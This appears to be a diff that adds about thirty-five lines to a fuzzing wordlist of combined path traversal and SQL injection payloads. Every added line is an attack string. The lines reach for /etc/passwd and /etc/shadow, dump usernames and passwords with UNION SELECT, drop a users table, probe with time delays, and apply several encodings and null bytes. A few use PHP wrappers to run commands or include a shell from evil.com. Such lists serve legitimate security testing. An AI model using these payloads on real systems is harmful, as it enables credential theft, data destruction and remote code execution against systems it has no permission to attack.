@@ -1,2 +1,35 @@
+../etc/passwd' OR 1=1--
+../../etc/passwd' UNION SELECT NULL--
 ../../../etc/passwd' AND '1'='1
-../../../etc/passwd' OR '1'='1
+../../../etc/shadow' OR '1'='1
+/etc/passwd' UNION SELECT NULL,NULL--
+/etc/passwd' AND 1=1--
+../etc/passwd'/**/OR/**/1=1--
+'../etc/passwd' OR 1=1--
+"../etc/passwd" OR 1=1--
+'../../../etc/passwd'; DROP TABLE users--
+../etc/passwd; SLEEP(5)--
+../../etc/passwd; WAITFOR DELAY '0:0:5'--
+../../../etc/passwd; SELECT pg_sleep(5)--
+../etc/passwd' UNION SELECT username,password FROM users--
+/etc/passwd' UNION SELECT table_name,NULL FROM information_schema.tables--
+../etc/passwd' UNION SELECT schema_name FROM information_schema.schemata--
+..%2Fetc%2Fpasswd' OR 1=1--
+..%2F..%2Fetc%2Fpasswd' UNION SELECT NULL--
+..%2F..%2F..%2Fetc%2Fpasswd' AND '1'='1
+%2e%2e%2fetc%2fpasswd' OR 1=1--
+%2e%2e%2f%2e%2e%2fetc%2fpasswd' UNION SELECT NULL--
+..%252Fetc%252Fpasswd' OR 1=1--
+../etc/passwd%00' OR 1=1--
+../../etc/passwd%00' UNION SELECT NULL--
+php://filter/convert.base64-encode/resource=index.php' OR 1=1--
+php://input' OR 1=1--
+data://text/plain,<?php system('id');?>' OR 1=1--
+http://evil.com/shell.php' OR 1=1--
+../../../etc/passwd'--
+../../etc/passwd'/*
+../etc/passwd'#
+/etc/passwd' OR 'x'='x
+/etc/shadow' OR 'x'='x
+'../../../../etc/passwd
+"../../../../etc/passwd
